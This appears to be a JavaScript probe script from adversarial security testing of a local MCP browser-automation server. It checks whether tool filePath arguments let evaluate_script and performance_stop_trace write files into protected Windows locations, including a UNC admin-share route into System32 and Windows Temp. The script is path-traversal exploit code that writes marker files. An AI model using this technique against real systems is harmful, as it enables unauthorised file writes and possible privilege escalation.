// adv-08 round 3: UNC vs System32 boundary + save_pdf traversal confirm + perf trace traversal w/ active trace
import fs from 'node:fs';
const BASE = 'http://127.0.0.1:7890/mcp';
let sid, i = 0;
const rpc = async b => {
  const r = await fetch(BASE, { method: 'POST', headers: { 'content-type': 'application/json', 'accept': 'application/json, text/event-stream', ...(sid ? { 'mcp-session-id': sid } : {}) }, body: JSON.stringify(b) });
  const t = await r.text();
  if (!sid) sid = r.headers.get('mcp-session-id');
  const m = t.split('\n').filter(l => l.startsWith('data:')).map(l => JSON.parse(l.slice(5).trim()));
  return { msg: m[m.length - 1], status: r.status };
};
await rpc({ jsonrpc: '2.0', id: ++i, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 't', version: '0' } } });
await rpc({ jsonrpc: '2.0', method: 'notifications/initialized' });
const call = (n, a) => rpc({ jsonrpc: '2.0', id: ++i, method: 'tools/call', params: { name: n, arguments: a } });
const exists = p => { try { return fs.existsSync(p); } catch { return 'ERR'; } };
const text = r => r.msg?.result?.content?.[0]?.text ?? JSON.stringify(r.msg);
const np = await call('new_page', { url: 'https://example.com' });
const npTxt = text(np);
const pageId = JSON.parse(npTxt.slice(npTxt.indexOf('{'))).pageId;
const ev = fp => ({ pageId, function: '() => "PWNED"', filePath: fp });
const probe = async (label, tool, args, checkPaths) => {
  const r = await call(tool, args);
  console.log(`[${label}]\n  resp: ${text(r).split('\n').slice(0, 2).join(' | ').slice(0, 200)}\n  disk: ${checkPaths.map(p => `${p} => ${exists(p)}`).join(' ; ')}`);
};
// Does UNC c$ bypass the System32 EPERM?
await probe('UNC -> System32 (UAC bypass?)', 'evaluate_script', ev('\\\\127.0.0.1\\c$\\Windows\\System32\\mcp-unc-bypass.txt'), ['\\\\127.0.0.1\\c$\\Windows\\System32\\mcp-unc-bypass.txt']);
// UNC -> Windows dir (non-System32)
await probe('UNC -> C:\\Windows\\Temp', 'evaluate_script', ev('\\\\127.0.0.1\\c$\\Windows\\Temp\\mcp-unc-temp.txt'), ['\\\\127.0.0.1\\c$\\Windows\\Temp\\mcp-unc-temp.txt']);
// performance trace traversal WITH active trace this time
await call('performance_start_trace', { pageId, reload: false });
await new Promise(r => setTimeout(r, 1000));
await probe('perf trace -> C:/Windows/Temp', 'performance_stop_trace', { pageId, filePath: 'C:/Windows/Temp/mcp-trace-pwn.json' }, ['C:/Windows/Temp/mcp-trace-pwn.json']);
// dir-only creation side effect: path whose write fails but mkdir succeeds?
await probe('mkdir-only side effect (deep new dir tree on C: temp)', 'evaluate_script', ev('C:/Windows/Temp/mcp-mkdir/a/b/c/x.txt'), ['C:/Windows/Temp/mcp-mkdir/a/b/c/x.txt', 'C:/Windows/Temp/mcp-mkdir']);
await call('close_page', { pageId });
console.log('DONE3');
